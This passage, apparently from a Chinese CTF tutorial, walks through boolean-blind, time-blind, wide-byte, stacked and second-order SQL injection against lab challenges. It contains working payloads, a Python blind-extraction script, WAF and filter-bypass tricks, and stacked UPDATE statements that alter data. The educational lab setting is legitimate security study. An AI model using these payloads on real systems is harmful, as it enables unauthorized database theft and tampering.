| :--------------------------------------------------- | :---------------------------- | :----------------------------------------------------------- |
| **只需获取最新数据**（如枚举库名、导出表）           | **`--fresh-queries`**         | **最轻量**。它只强制重新向数据库发送查询，忽略已缓存的结果，但会保留注入点等元数据，效率最高。 |
| **对同一目标需要“从头再来”**                         | **`--flush-session`**         | **中等粒度**。它会直接删除该目标对应的整个会话文件（`.sqlite`），清除所有历史记录（注入点、指纹、数据等），相当于对该目标进行一次全新的扫描。 |
| **目标环境已发生根本变化**（如漏洞已修复、应用重构） | **`--flush-session`**         | 这是最典型的场景。必须彻底清除旧状态，才能准确评估当前环境的安全性。 |
| **sqlmap 运行报错**（会话文件损坏、I/O 错误）        | **`--purge`** 或 **手动删除** | 当会话文件本身已损坏，无法正常读写时，需要强制删除它。       |
| **需要全局重置**（清理所有历史痕迹、释放空间）       | **`--purge`**                 | **最彻底**。它会安全地删除整个 sqlmap 数据目录（`output/`）下的所有内容，作用于所有历史目标。 |

1. **不同域名/IP/端口**：一般各自独立，不需要 flush。

2. **同一个靶场平台、同一个域名/端口，只是路径或参数不同**：sqlmap 可能仍复用同一个 host 的会话文件。比如：

   - `http://ctf.example.com:8000/chal1.php?id=1`
   - `http://ctf.example.com:8000/chal2.php?id=1`

   如果平台是同一 host:port 反代多题，sqlmap 可能把缓存混在一起，出现“秒出上次的库名/表名”、结果和当前题不符，甚至会话报错。

## 布尔盲注：

> 布尔盲注（Boolean-based blind SQL Injection）是盲注的一种：页面**不回显数据、也不报数据库错误**，但同一个请求在“条件为真”和“条件为假”时，响应存在**可稳定区分的差异**。攻击者把想获取的信息拆成一个个“是/否”问题，通过响应差异逐字符推断出数据库内容。
>
> 它的本质是：**把数据提取问题转化为一个布尔判定问题**。

### 一、前提条件

布尔盲注能成立，必须同时满足：

1. **注入点存在**：参数可拼接进 SQL 并影响执行逻辑。
2. **无回显、无报错**：否则优先用联合查询或报错注入，效率高得多。
3. **真假条件响应可区分**：这是盲注的命脉。差异可能体现在：
   - 页面内容长度不同（最常见）
   - 页面出现/消失某个字符串（如“登录成功” vs “登录失败”）
   - HTTP 状态码不同（200 vs 500、302 vs 200）
   - 响应时间有细微但稳定的差别（如果连时间都无差异，才退化为时间盲注）



### 例题5：布尔盲注

![SQL 注入 · 例题5：布尔盲注](/images/uploads/sql-injection-26.png)

按惯例先做数字型判别：

```
id=1            → 查询成功
id=1 and 1=1    → 查询成功
id=1 and 1=2    → 查询成功   ← 异常！应该失败
id=1 and 3=4    → 查询成功   ← 还是成功
id=1'           → 未找到员工信息
```

`and 1=2` 应该让条件变假，但它成功了。第一反应是"没有注入"，但这个结论是错的。

![SQL 注入 · and 1=2 应该让条件变假，但它成功了。第一反应是"没有注入"，](/images/uploads/sql-injection-27.png)

id=1 and 1=1    → 查询成功
id=1 and 1=2    → 查询成功

两者都成功,也就说明不是数字型，那我们就要去找这个sql注入的真正闭合方式

| 测试  | 结果     | 解读                                      |
| :---- | :------- | :---------------------------------------- |
| `1'`  | **失败** | 单引号破坏了语法 → 外层是单引号           |
| `1''` | **成功** | 两个引号转义成一个，语法恢复 → 确认单引号 |
| `1"`  | 成功     | 双引号无影响 → 不是双引号包裹             |
| `1""` | 成功     | 同上                                      |

| payload       | 结果   |
| ------------- | ------ |
| 1' and '1'='1 | 成功   |
| 1' and '1'='2 | 未找到 |

### 先测长度

二分测长度（上限设 200，实际库里数据不会更长）：

```
1' and (select length(database()))>100#   → 假
1' and (select length(database()))>50#    → 假
1' and (select length(database()))>25#    → 假
1' and (select length(database()))>12#    → 假
1' and (select length(database()))>6#     → 假
1' and (select length(database()))>3#     → 真
1' and (select length(database()))>4#     → 假
```

7 次请求，确定长度 = 4（大于 3、不大于 4）。

ASCII 可打印字符范围是 32～126，在这个区间里二分：

```
1' and ascii(substr(database(),1,1))>79#    → 真
1' and ascii(substr(database(),1,1))>103#   → 真
1' and ascii(substr(database(),1,1))>115#   → 真
1' and ascii(substr(database(),1,1))>121#   → 假
1' and ascii(substr(database(),1,1))>118#   → 假
1' and ascii(substr(database(),1,1))>116#   → 真
1' and ascii(substr(database(),1,1))>117#   → 假
```

收敛过程：

| 次数 | 区间    | 判断    | 结果区间 |
| :--- | :------ | :------ | :------- |
| 1    | 32-126  | >79 真  | 80-126   |
| 2    | 80-126  | >103 真 | 104-126  |
| 3    | 104-126 | >115 真 | 116-126  |
| 4    | 116-126 | >121 假 | 116-121  |
| 5    | 116-121 | >118 假 | 116-118  |
| 6    | 116-118 | >116 真 | 117-118  |
| 7    | 117-118 | >117 假 | **117**  |

`chr(117)` = `u`，库名第 1 个字符确定。

**7 次请求一个字符**。如果线性枚举 `ascii(...)=32`、`=33`…最多要 95 次。二分把复杂度从 O(n) 降到 O(log n)。

![SQL 注入 · 7 次请求一个字符。如果线性枚举 ascii(...)=32、=33](/images/uploads/sql-injection-28.png)

然后我们可以写脚本

```python
import urllib.request, urllib.parse, time

URL = "http://docker.qingcen.net:47046/"
TRUE_STR = "查询成功"

def inject(payload):
    """发请求，返回布尔值"""
    data = urllib.parse.urlencode({"id": payload})
    req = urllib.request.Request(f"{URL}?{data}", headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return TRUE_STR in r.read().decode("utf-8", "ignore")

def get_length(expr):
    """二分长度"""
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if inject(f"1' and (select length({expr}))>{mid}#"):
            lo = mid + 1      # 长度在右半区
        else:
            hi = mid          # 长度在左半区
    return lo

def get_char(expr, pos):
    """二分单个字符的 ASCII"""
    lo, hi = 31, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if inject(f"1' and ascii(substr({expr},{pos},1))>{mid}#"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def get_string(expr, label=""):
    """取完整字符串"""
    n = get_length(expr)
    result = []
    for i in range(1, n + 1):
        result.append(get_char(expr, i))
        print(f"\r{label}{''.join(result)}", end="", flush=True)
        time.sleep(0.05)      # 限速，避免触发防护
    print()
    return ''.join(result)
```

但是我推荐用sqlmap来自动化跑

这个题目有点特殊

sqlmap 判断"参数是否动态"时，用响应内容相似度，阈值 0.98。这题：

```
id=1        → 5563 字节（查询成功）
id=1' AND 1=2# → 5571 字节（未找到）
差异 8 字节，相似度 0.9986
```

0.9986 > 0.98，sqlmap 认为"没有实质变化"，直接判定参数不动态，后面的测试全部跳过或降级。

所以我把阈值改成 0.9999 了

文件 `lib/core/settings.py` 第 61 行：

```
# 原值UPPER_RATIO_BOUND = 0.98
# 改成UPPER_RATIO_BOUND = 0.9999
```

改完不需要重装，直接跑就行。

![SQL 注入 · 改完不需要重装，直接跑就行。](/images/uploads/sql-injection-29.png)

![SQL 注入 · 改完不需要重装，直接跑就行。](/images/uploads/sql-injection-30.png)

![SQL 注入 · 改完不需要重装，直接跑就行。](/images/uploads/sql-injection-31.png)

![SQL 注入 · 改完不需要重装，直接跑就行。](/images/uploads/sql-injection-32.png)

![SQL 注入 · 改完不需要重装，直接跑就行。](/images/uploads/sql-injection-33.png)

成功拿到flag

![SQL 注入 · 成功拿到flag](/images/uploads/sql-injection-34.png)

## 时间盲注：

> 时间盲注（Time-based blind SQL Injection）是盲注中最“兜底”的一种：页面**不回显数据、不报数据库错误、真假条件的响应内容也几乎没有差异**，唯一能利用的信号是——**数据库执行查询所花的时间**。攻击者构造条件语句，让“条件为真”时数据库故意延迟若干秒，“条件为假”时立即返回，再通过测量响应时间来判断条件真假，逐字符推断数据。

### 例题6：时间盲注

![SQL 注入 · 例题6：时间盲注](/images/uploads/sql-injection-35.png)

### 1.排除联合查询

先看基线：

```
id=1    → 5656 字节
id=2    → 5656 字节
id=999  → 5656 字节
abc     → 5656 字节（连非法输入都一样）
```

页面正文只有一句固定文案：

```
<p>The query results have been sent to your email.</p>
```

**"结果已发到邮箱"** —— 这是出题人的设计：查询确实执行了，但结果不渲染到页面。

再试 UNION：

```
1' union select 1,2,3,4#   → 5655 字节，页面无变化
0 union select 1,2,3,4#    → 5655 字节，页面无变化
```

即使 UNION 语法正确、列数正确，**注入的结果也没有地方显示**。没有回显位，UNION 就失去了意义。

**排除依据：页面不存在任何会因查询结果而变化的区域。**

### 2.排除报错注入 —— 错误被吞

```
1'                                          → 5655 字节，无错误
1"                                          → 5655 字节，无错误
1' AND extractvalue(1,concat(0x7e,database())) AND '1'='1
                                            → 5655 字节，无错误
```

如果错误回显，`extractvalue` 会抛出 `XPATH syntax error: '~user'`，页面应该多出这段文字。

实际响应长度没有任何变化，说明后端的错误处理是：

```
if (!$result) { /* 静默失败，只显示固定文案 */ }
```

**排除依据：`extractvalue` 是强报错函数，它执行了却看不到任何错误输出，说明错误被完全吞掉。**

![SQL 注入 · 排除依据：extractvalue 是强报错函数，它执行了却看不到任](/images/uploads/sql-injection-36.png)

### 3.排除布尔盲注

这是最关键的一步。测试四组真假条件，对响应算 MD5：

| payload                | 长度 | 响应 MD5       |
| :--------------------- | :--- | :------------- |
| `1' AND '1'='1#`（真） | 5655 | `f21b2347dd74` |
| `1' AND '1'='2#`（假） | 5655 | `f21b2347dd74` |
| `1' AND 1=1#`（真）    | 5655 | `f21b2347dd74` |
| `1' AND 1=2#`（假）    | 5655 | `f21b2347dd74` |

**四个 MD5 完全一致。** 不是"相似"，是逐字节相同。

布尔盲注的前提是"真和假至少有一个可区分的特征"——响应长度、状态码、关键字、某个 div 是否存在。这题一个都没有，真假响应是同一个二进制文件。

**排除依据：布尔条件无法产生任何可观测差异，判断不出真假。**

### 4.确认时间盲注

先确定闭合方式：

```
1 AND sleep(2)       → 0.12s   （数字型，无闭合，不执行）
1' AND sleep(2)#     → 2.20s   ✅ 有延迟
1" AND sleep(2)#     → 0.13s   （双引号不是闭合）
1) AND sleep(2)#     → 0.13s   （无括号）
1') AND sleep(2)#    → 0.13s   （无括号）
```

![SQL 注入 · 1') AND sleep(2)# → 0.13s （无括号）](/images/uploads/sql-injection-37.png)

### 为什么只能是时间盲注

这题的设计把前三条路全部堵死了：

| 出题人的设计   | 堵死的手段     |
| :------------- | :------------- |
| 结果"发到邮箱" | UNION 无处输出 |
| 错误静默处理   | 报错注入无信息 |
| 页面完全静态   | 布尔盲注无差异 |

剩下的唯一出口就是**时间**——因为时间不在页面里，攻击者只能通过"响应慢了几秒"来判断条件真假。

```
1' AND if((select length(database()))>0, sleep(2), 0)#   → 2.1s  真
1' AND if((select length(database()))>100, sleep(2), 0)# → 0.1s  假
```

然后就是标准的二分流程，每判断一位要等 2 秒（可以用 `sleep(1)` 加速）。42 字符的 flag 大约 300 次判断，耗时十几分钟——比 47046 那种布尔盲注慢得多，这是时间盲注的固有代价。

![SQL 注入 · 然后就是标准的二分流程，每判断一位要等 2 秒（可以用 sleep(](/images/uploads/sql-injection-38.png)

![SQL 注入 · 然后就是标准的二分流程，每判断一位要等 2 秒（可以用 sleep(](/images/uploads/sql-injection-39.png)

![SQL 注入 · 然后就是标准的二分流程，每判断一位要等 2 秒（可以用 sleep(](/images/uploads/sql-injection-40.png)

只要确定了方法之后，步骤就和前面一样了

爆表名

![SQL 注入 · 只要确定了方法之后，步骤就和前面一样了](/images/uploads/sql-injection-41.png)

![SQL 注入 · 只要确定了方法之后，步骤就和前面一样了](/images/uploads/sql-injection-42.png)

爆列名

![SQL 注入 · 只要确定了方法之后，步骤就和前面一样了](/images/uploads/sql-injection-43.png)

![SQL 注入 · 只要确定了方法之后，步骤就和前面一样了](/images/uploads/sql-injection-44.png)

dump数据

![SQL 注入 · SQL 注入实操](/images/uploads/sql-injection-45.png)

![SQL 注入 · SQL 注入实操](/images/uploads/sql-injection-46.png)

成功得到flag

## 常见过滤方式与绕过技巧

### 1. 关键字过滤 (SELECT, UNION, AND, OR 等)

这是最基础的防御，通过黑名单拦截敏感的 SQL 关键字。

- **大小写混淆**：数据库对关键字大小写不敏感，但简单的过滤器可能只匹配小写或大写。可以混合大小写来绕过，例如将 `SELECT` 写作 `SeLeCt`。
- **双写关键字**：如果过滤器是“一次性”的替换（非递归），可以将关键字重复写入。当中间的敏感词被移除后，剩下的部分会重新组合成完整的关键字，例如 `UNunionION SELselectECT` 在被过滤一次后，会还原为 `UNION SELECT`。
- **内联注释插入**：在关键字中间插入注释，破坏其完整形态，例如 `un/**/ion sel/**/ect`。
- **使用同义词或等价符号**：用 `||` 代替 `OR`，用 `&&` 代替 `AND`；或者用 `LIKE`、`REGEXP`、`BETWEEN` 等操作符来替代 `=`。

### 2. 空格过滤

空格是 SQL 语句的必需分隔符，因此也常被过滤。

- **注释符替换**：使用 `/**/` 来代替空格，例如 `SELECT/**/username/**/FROM/**/users`。
- **空白字符替换**：使用其他不可见字符，如 **Tab (`%09`)、换行 (`%0A`)、回车 (`%0D`)** 等来替代空格。
- **括号嵌套**：用括号将语句包裹起来，有时可以避免使用空格，例如 `SELECT(user)FROM(dual)`。
- **加号 (`+`)**：在 URL 参数中，`+` 号可以被解码为空格。

### 3.等号 (`=`) 过滤

等号用于比较，是布尔盲注的核心。

- **使用 `LIKE`, `RLIKE`, `REGEXP`**：这些模式匹配操作符可以部分替代等号的功能。

# 三、一些特殊的sql注入类型

## 1.宽字节注入：

> 宽字节注入是 SQL 注入中的一种特殊类型。它的核心不是 SQL 语法本身，而是字符编码处理不一致，导致数据库对转义字符的理解发生变化。
>
> 我们可以先记住一句话：
>
> > 程序认为某个反斜杠 `\` 是用来转义单引号的，但数据库在宽字节编码下，却可能把这个反斜杠当成一个汉字的组成部分。

### 先理解什么是宽字节

计算机存储字符时，本质上存储的是字节。

不同字符编码，对字节的解释方式不同。

常见的编码有：

- ASCII：通常一个字符占 1 个字节。
- UTF-8：一个字符可能占 1～4 个字节。
- GBK：一个汉字通常占 2 个字节。

例如，在 GBK 编码下，一个汉字可能由下面两个字节组成：

```
第一个字节：0xB0
第二个字节：0xA1
```

数据库会把这两个字节组合起来，识别为一个汉字。

这就引出了一个关键问题：

如果两个字节中，第二个字节恰好是反斜杠 `\`，会发生什么？

这就是宽字节注入的突破口。



### 例题7：宽字节注入

![SQL 注入 · 例题7：宽字节注入](/images/uploads/sql-injection-47.png)

![SQL 注入 · 例题7：宽字节注入](/images/uploads/sql-injection-48.png)

输入 `1'`：

```
URL:     %31%27
解码后:  1'
转义后:  1\'
拼接:    WHERE id = '1\'' LIMIT 50
```

`\'` 是转义的单引号，字符串内容变成 `1'`，引号没有闭合字符串，逃逸失败。

### `%df` 为什么能逃掉

输入 `1%df%27`：

```
URL:        %31%df%27
解码后:     1 + U+FFFD + '        ← %df 是无效 UTF-8，被替换成 U+FFFD
转义后:     1 + U+FFFD + \'       ← 单引号前加反斜杠
拼接:       WHERE id = '1<U+FFFD>\'' LIMIT 50
```

关键在**字节层**。U+FFFD 的 UTF-8 编码是 `ef bf bd`，反斜杠是 `5c`，单引号是 `27`。所以拼出来的字节序列是：

![SQL 注入 · 关键在字节层。U+FFFD 的 UTF-8 编码是 ef bf bd](/images/uploads/sql-injection-49.png)

```
1%df%27%23                    → 返回 id=1        （语法恢复）
1%df%27 AND 1=1%23            → 返回 id=1        （真）
1%df%27 AND 1=2%23            → 无查询结果        （假）
```

一真一假，布尔条件生效，注入确认。

![SQL 注入 · 一真一假，布尔条件生效，注入确认。](/images/uploads/sql-injection-50.png)

用**报错注入**最省事：

```
1%df%27 AND extractvalue(1,concat(0x7e,database()))#
```

![SQL 注入 · 1%df%27 AND extractvalue(1,concat(](/images/uploads/sql-injection-51.png)

爆表名

select group_concat(table_name) from information_schema.tables where table_schema=database()

![SQL 注入 · select group_concat(table_name) fr](/images/uploads/sql-injection-52.png)

### 列名——这里遇到第二个坑

直接写 `table_name='flag_store'` 会失败：

```
near '\'flag_store\')))#' LIMIT 50
```

因为 payload 里的单引号**也被转义了**（转义函数对整段输入生效，不分你是不是在引号里）。

解决办法：**用十六进制表示表名，彻底避开引号**：

```
flag_store = 0x666c61675f73746f7265
users      = 0x7573657273
```

```
select group_concat(column_name) from information_schema.columns
where table_schema=database() and table_name=0x666c61675f73746f7265
→ id, flag
```

```
http://docker.qingcen.net:30423/query?id=%df%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28select+group_concat%28column_name%29+from+information_schema.columns+where+table_schema%3Ddatabase%28%29+and+table_name%3D0x666c61675f73746f7265%29%29%29%23
```

![SQL 注入 · http://docker.qingcen.net:30423/qu](/images/uploads/sql-injection-53.png)

爆flag

```
%df' AND extractvalue(1,concat(0x7e,(select group_concat(flag) from flag_store)))#
```

![SQL 注入 · %df' AND extractvalue(1,concat(0x7](/images/uploads/sql-injection-54.png)

```
%df' AND extractvalue(1,concat(0x7e,(select substr(flag,20,30) from flag_store)))#
```

![SQL 注入 · %df' AND extractvalue(1,concat(0x7](/images/uploads/sql-injection-55.png)

成功得到flag

URL 里凡是看到 `ß`、`Ã`、`�` 这类乱码字符出现在 `%df` 的位置，**一律换回 `%df`**。这些字符是浏览器或工具"友好显示"解码的结果，原样发出去字节就变了，宽字节注入立刻失效

## 2.堆叠注入

> 堆叠注入（Stacked Queries Injection）是通过在参数中注入**分号 `;`**，结束原 SQL 语句后**再拼接一条或多条新的 SQL 语句**，让数据库依次执行。它与联合查询的本质区别是：联合查询是把恶意查询的结果“拼”进原查询的结果集里回显；而堆叠注入是**真正执行额外的独立语句**，可以 `INSERT`、`UPDATE`、`DELETE`、`DROP`、`CREATE`，甚至调用存储过程、写文件、执行系统命令。

### 例题8：堆叠注入

![SQL 注入 · 例题8：堆叠注入](/images/uploads/sql-injection-56.png)

### 第一步：确认注入类型

| payload         | 结果                         |
| :-------------- | :--------------------------- |
| `1`             | 正常，Alice/IT/5000          |
| `1'`            | Query failed（引号破坏语法） |
| `1 and 1=1`     | 成功                         |
| `1 and 1=2`     | **也成功**（整串转数字）     |
| `1' and '1'='1` | 成功                         |
| `1' and '1'='2` | **未找到**                   |

最后两条一真一假，确认**单引号字符型注入**。`and 1=2` 之所以"成功"，是因为 `'1 and 1=2'` 被 MySQL 当字符串转成数字 1，条件根本没参与运算——这是字符型注入的典型假象。

![SQL 注入 · 最后两条一真一假，确认单引号字符型注入。and 1=2 之所以"成功](/images/uploads/sql-injection-57.png)

![SQL 注入 · 最后两条一真一假，确认单引号字符型注入。and 1=2 之所以"成功](/images/uploads/sql-injection-58.png)

![SQL 注入 · 最后两条一真一假，确认单引号字符型注入。and 1=2 之所以"成功](/images/uploads/sql-injection-59.png)

这里也很明显能看出是四列

我们正常走联合查询注入的方法

![SQL 注入 · 我们正常走联合查询注入的方法](/images/uploads/sql-injection-60.png)

会发现被拦截

| 关键词   | 结果                             |
| :------- | :------------------------------- |
| `select` | **拦截**（大小写、URL 编码都拦） |
| `update` | 放行                             |
| `insert` | 放行                             |
| `delete` | 放行                             |
| `union`  | 放行                             |
| `;`      | 放行                             |

WAF 在 PHP 层检测 `$_GET['id']`（解码后），所以 `%73elect`、`SeLeCt` 全部无效。

**关键判断：`select` 被拦，但 `update`/`insert`/`delete` 和分号都没被拦 → 堆叠注入可行。**

业务表用 `employees`/`users`，flag 表用 `flag`

## 多表 UPDATE 命令详解

```
1';update employees,flag set employees.name=flag.flag where employees.id=1 and flag.id=1#
```

### 逐段拆解

```
1'                                    ← ① 闭合原查询的单引号
;                                     ← ② 语句分隔符
update employees,flag                 ← ③ 多表更新，涉及两张表
set employees.name=flag.flag          ← ④ 把 flag 表的值赋给 employees 表
where employees.id=1 and flag.id=1    ← ⑤ 连接条件 + 过滤条件
#                                     ← ⑥ 注释掉原查询残留的部分
```

**① `1'`** — 原查询是 `WHERE id = '1'`，这个单引号让字符串提前闭合，后面的内容变成可执行的 SQL。

**② `;`** — MySQL 的语句分隔符。PHP 用的是 `mysqli_multi_query()`，支持一次执行多条语句。

**③ `update employees,flag`** — 多表 UPDATE 语法，逗号分隔两张表。这是 MySQL 的扩展，等价于：

```
UPDATE employees JOIN flag ON ...
```

**④ `set employees.name=flag.flag`** — 赋值语句。左边是目标列（employees 表的 name），右边是数据来源（flag 表的 flag 列）。**这里直接引用了另一张表的列，不需要子查询。**

**⑤ `where employees.id=1 and flag.id=1`** — 两个条件各管一件事：

- `employees.id=1`：只更新 Alice 这一行，避免全表被改
- `flag.id=1`：只取 flag 表 id=1 的那一行

**⑥ `#`** — 原查询末尾还有 `' LIMIT 50` 之类的残留，用注释符截断。

## 验证堆叠真的执行

```
1';update employees set name='HACKED' where id=1#
```

![SQL 注入 · 1';update employees set name='HACK](/images/uploads/sql-injection-61.png)

![SQL 注入 · 1';update employees set name='HACK](/images/uploads/sql-injection-62.png)

数据真的被改了，证明 PHP 用的是 `mysqli_multi_query()` 或等价的多语句执行，**堆叠注入成立**。

这条语句直接把 `flag` 表里的 `flag` 列，写入 `employees` 表的 `name` 列。**全程没有 select**，WAF 放行。

拼进注入点：

```
1';update employees,flag set employees.name=flag.flag where employees.id=1 and flag.id=1#
```

再查询id1成功得到flag

![SQL 注入 · 再查询id1成功得到flag](/images/uploads/sql-injection-63.png)

## 3.二次注入

> 二次注入（Second-order SQL Injection）是一种**注入点与触发点分离**的 SQL 注入：恶意数据先被应用**安全地存入数据库**（写入时通常经过了转义/过滤，不会立即触发），之后在**另一个功能点**被取出、并被**直接拼接进新的 SQL 语句**执行时才爆发。换句话说，第一次请求只是“埋雷”，第二次请求才“踩雷”。
>
> 它的本质是：**应用信任了数据库里的数据**，认为“从自己库里取出来的东西是安全的”，从而在取出后不再做转义，直接拼 SQL。

### 例题9：二次注入

![SQL 注入 · 例题9：二次注入](/images/uploads/sql-injection-64.png)

**二次注入（Second-Order SQL Injection）** 的特点：注入语句不是在同一次请求里生效，而是**先存进数据库，在之后的另一次查询中被触发**。

```
第一次（存储）：注册时把 admin'# 写进数据库
                        ↓
第二次（触发）：登录后查笔记，用户名从数据库读出，拼进 SQL
                        ↓
              # 注释掉条件，查询变成 WHERE username='admin'
                        ↓
              读到 admin 的私密笔记（flag）
```

```
1. 注册
   POST reg_username=admin'#
        ↓
   INSERT ... VALUES ('admin\'#', ...)     ← 转义只在这一步生效
        ↓
   数据库存储：admin'#                       ← 原始值入库

2. 登录
   POST login_username=admin'#
        ↓
   SELECT * FROM users WHERE username='admin'#' AND password='...'
        ↓
   # 注释掉 password 条件 → 登录成功（用户名匹配即可）

3. 访问笔记
   GET ?page=notes
        ↓
   SELECT content FROM notes WHERE username='admin'#'
        ↓
   等价于 WHERE username='admin'
        ↓
   读到 admin 的私密笔记 → flag
```

![SQL 注入 · 读到 admin 的私密笔记 → flag](/images/uploads/sql-injection-65.png)

意思也就是我们成功登录进去了管理员权限

也可以和联合查询注入结合

```
# 1. 探列数（短，可靠）
u' ORDER BY 2#        → 200
u' ORDER BY 3#        → 500   → 确认 2 列

# 2. 定位回显（短）
u' UNION SELECT 1,2#  → 显示 2  → 第 2 列回显

# 3. 读数据（短）
u' UNION SELECT 1,database()#
→ user

u' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x75736572 LIMIT 1#
→ user_notes

u' UNION SELECT 1,note_content FROM user_notes LIMIT 1#
→ flag{...}
```

